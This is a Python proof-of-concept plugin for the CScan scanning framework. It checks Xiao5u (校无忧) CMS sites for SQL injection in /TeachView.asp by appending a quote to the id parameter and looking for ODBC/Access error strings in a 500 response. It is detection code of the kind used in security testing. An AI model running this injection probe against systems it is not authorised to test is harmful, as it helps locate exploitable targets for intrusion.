# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'Xiao5u_0001' # 平台漏洞编号，留空
    name = '校无忧建站系统 /TeachView.asp SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-08-02'  # 漏洞公布时间
    desc = '''
        Xiao5u cms website have sql injection error.
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=065350
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Xiao5u(校无忧)'  # 漏洞应用名称
    product_version = '非商业授权所有版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8ca4f765-62a7-4674-86d5-334436f1a4c7'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            attack_url_base = '{target}'.format(target=self.target) + "/TeachView.asp"
            attack_url = attack_url_base + "?id=99999999999%27"
            user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}
            
            request = urllib2.Request(attack_url,headers=user_agent)
            error_string = "Microsoft OLE DB Provider for ODBC Drivers"
            error_num = "80040e14"
            error_detail = "[Microsoft][ODBC Microsoft Access Driver]"

            try:
                response = urllib2.urlopen(request)
            except urllib2.URLError as e:
                if hasattr(e, 'code'):
                    if e.getcode() == 500:
                        content = e.read()
                        if error_num in content and error_string in content and error_detail in content:
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()
        
if __name__ == '__main__':
    Poc().run()